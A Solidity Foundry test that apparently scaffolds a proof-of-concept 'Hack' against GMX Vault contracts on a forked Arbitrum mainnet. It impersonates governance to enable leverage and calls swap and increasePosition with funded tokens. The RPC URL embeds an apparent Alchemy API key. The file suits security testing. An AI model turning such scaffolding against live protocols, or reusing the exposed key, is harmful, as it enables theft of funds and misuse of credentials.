pragma solidity 0.6.12;

import "forge-std/Test.sol";

import {Vault as VaultLike} from "gmx-contracts/core/Vault.sol";
import {GlpManager} from "gmx-contracts/core/GlpManager.sol";
import {GLP as ERC20Like} from "gmx-contracts/gmx/GLP.sol";
import {USDG} from "gmx-contracts/tokens/USDG.sol";

contract Addrs is Test {
    address public constant priceFeed = 0xfe661cbf27Da0656B7A1151a761ff194849C387A;
    address public constant router = 0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064;
    address public constant usdg = 0x45096e7aA921f27590f8F19e457794EB09678141;
    address public constant vault = 0x489ee077994B6658eAfA855C308275EAd8097C4A;
    address public constant glp = 0x4277f8F2c384827B5273592FF7CeBd9f2C1ac258;
    address public constant gov = 0x1e0FD2CC7329Ddf6bDA35f85579E1bC2996dB0d9;

    address public constant USDC = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address public constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
}

contract Hack is Addrs {
    constructor() public {
        ERC20Like(USDC).approve(vault, type(uint256).max);
        ERC20Like(WETH).approve(vault, type(uint256).max);
    }

    function swap() public {
        ERC20Like(USDC).transfer(vault, 1000 * 10 ** 6);
        VaultLike(vault).swap(USDC, WETH, address(this));
    }

    function increasePosition() public {
        ERC20Like(WETH).transfer(vault, 1 ether);
        VaultLike(vault).increasePosition(address(this), WETH, WETH, 1600 * 10 * 10**30, true);
    }
    
}

contract POC is Addrs {
    Hack public hack;
    GlpManager public glpManager;

    function setUp() public {
        vm.createSelectFork("https://arb-mainnet.g.alchemy.com/v2/RTb8ZyTgyCSlZJw9V6EtmzqRkT5rFBwG", 22621954);
        vm.prank(gov);
        VaultLike(vault).setIsLeverageEnabled(true);

        // vault = new Vault();
        // vault.initialize(router, usdg, priceFeed, 5000000000000000000000000000000, 100, 100);
        // glpManager = new GlpManager(address(vault), usdg, glp, 15 * 60);
        // glpManager.setInPrivateMode(true);
        // GLP(glp).setMinter(address(glpManager), true);
        // USDG(usdg).addVault(address(glpManager));

        // vault.setFundingRate(60*60, 100, 100);
        // vault.setManager(address(glpManager), true);
        // vault.setFees(10,5,20,20,1,10,5000000000000000000000000000000,24*60*60,true);

        hack = new Hack();

        deal(USDC, address(hack), 1000 * 10 ** 6);
        deal(WETH, address(hack), 1000 ether);
    }

    function _test_swap() public {
        hack.swap();
    }

    function test_increasePosition() public {
        hack.increasePosition();
    }
}
